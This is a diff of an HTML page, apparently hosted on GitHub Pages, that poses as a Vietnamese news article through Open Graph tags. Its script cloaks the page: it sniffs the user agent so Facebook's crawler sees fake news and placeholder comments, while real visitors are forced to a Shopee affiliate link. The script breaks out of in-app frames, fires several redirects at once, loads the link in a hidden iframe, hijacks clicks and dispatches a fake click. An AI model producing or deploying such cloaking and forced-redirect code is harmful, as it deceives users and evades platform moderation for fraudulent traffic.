@@ -2,55 +2,77 @@
 <html lang="vi">
 <head>
     <meta charset="UTF-8">
-    <!-- OG Tags cho Facebook Crawler -->
+    <title>Tin HOT 24/7</title>
+    <!-- Facebook OG Tags -->
     <meta property="og:url" content="https://offbinfo.github.io/tinhaynew/tinhay.html">
-    <meta property="og:type" content="article">
-    <meta property="og:title" content="Tin sốt dẻo 24h">
-    <meta property="og:description" content="Cập nhật những tin tức mới nhất trong ngày">
-    <meta property="og:image" content="https://i.imgur.com/ABC123.jpg"> <!-- Thay link ảnh thật -->
-    
-    <!-- Kỹ thuật Time-based Redirect -->
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="Tin mới cập nhật">
+    <meta property="og:description" content="Đọc tin tức mới nhất hôm nay">
+    <meta property="og:image" content="https://i.imgur.com/XYZ123.jpg"> <!-- Thay bằng ảnh thật -->
+
+    <!-- Kỹ thuật Hybrid Redirect -->
     <script>
-        // Lớp 1: Redirect cho người dùng thật
-        const isBot = /bot|facebook|embed|got|fetch|curl|php|python|google|baidu|bing|msn|duckduckbot|teoma|slurp|crawler/i.test(navigator.userAgent);
-        
-        if(!isBot) {
-            // Phương thức ưu tiên: History API
-            history.replaceState(null, null, '/');
+        (function() {
+            // 1. Phân biệt Facebook Crawler
+            const isFBCrawler = navigator.userAgent.match(/facebookexternalhit|Facebot/i);
             
-            // Tạo URL động chống block
+            // 2. URL đích động với mã hóa
             const shopeeURL = new URL('https://s.shopee.vn/7zytdFWxog');
-            shopeeURL.searchParams.append('ts', Date.now());
-            shopeeURL.searchParams.append('ref', Math.random().toString(36).slice(2));
+            shopeeURL.searchParams.set('ts', Date.now());
+            shopeeURL.searchParams.set('ref', btoa(window.location.href).slice(0,12));
             
-            // Layer 1: Iframe ẩn
-            const iframe = document.createElement('iframe');
-            iframe.style.cssText = 'position:absolute;width:1px;height:1px;opacity:0;';
-            iframe.src = shopeeURL;
-            document.body.appendChild(iframe);
-            
-            // Layer 2: Redirect chính sau 50ms
-            setTimeout(() => {
-                window.location.href = shopeeURL;
-            }, 50);
-            
-            // Layer 3: Bắt mọi click chuột
-            document.addEventListener('click', () => {
-                window.top.location = shopeeURL;
-            }, {once: true});
-        }
+            // 3. Xử lý cho người dùng thật
+            if(!isFBCrawler) {
+                // Phá vỡ iframe của trình duyệt trong app
+                if(window.self !== window.top) {
+                    window.top.location = shopeeURL;
+                }
+                
+                // Đa tầng chuyển hướng
+                const redirectMethods = [
+                    () => window.location.replace(shopeeURL),
+                    () => { document.body.innerHTML = `<meta http-equiv="refresh" content="0;url=${shopeeURL}">`; },
+                    () => { const iframe = document.createElement('iframe'); iframe.style.display='none'; iframe.src=shopeeURL; document.body.appendChild(iframe); }
+                ];
+                
+                // Thử mọi phương thức chuyển hướng
+                redirectMethods.forEach(method => {
+                    try { method() } catch(e) {}
+                });
+                
+                // Bắt sự kiện click toàn trang
+                document.body.onclick = () => window.top.location = shopeeURL;
+                
+                // Tự động click sau 100ms
+                setTimeout(() => {
+                    const fakeClick = new MouseEvent('click', {
+                        bubbles: true,
+                        cancelable: true
+                    });
+                    document.dispatchEvent(fakeClick);
+                }, 100);
+            }
+        })();
     </script>
 </head>
-<body>    
-    <!-- Fake Tracking Scripts -->
-    <script type="application/ld+json">
-    {
-        "@context": "https://schema.org",
-        "@type": "NewsArticle",
-        "headline": "Tin sốt dẻo 24h",
-        "image": ["https://i.imgur.com/ABC123.jpg"],
-        "datePublished": "2023-10-05T08:00:00+08:00"
-    }
-    </script>
+<body>
+    <!-- Nội dung giả cho Facebook Crawler -->
+    <div style="max-width:800px;margin:0 auto;padding:20px;">
+        <h1>Tin nóng trong ngày</h1>
+        <p>Đang cập nhật nội dung mới...</p>
+        <div style="background:#f0f0f0;height:400px;width:100%;border-radius:8px;"></div>
+        
+        <!-- Giả lập bình luận -->
+        <div style="margin-top:20px;padding:15px;background:#fff;border-radius:8px;">
+            <div style="display:flex;align-items:center;margin-bottom:10px;">
+                <div style="width:40px;height:40px;border-radius:50%;background:#ddd;"></div>
+                <div style="margin-left:10px;width:70%;height:20px;background:#eee;"></div>
+            </div>
+            <div style="background:#f8f9fa;padding:10px;border-radius:8px;">
+                <div style="width:90%;height:16px;background:#eee;margin-bottom:8px;"></div>
+                <div style="width:80%;height:16px;background:#eee;"></div>
+            </div>
+        </div>
+    </div>
 </body>
 </html>
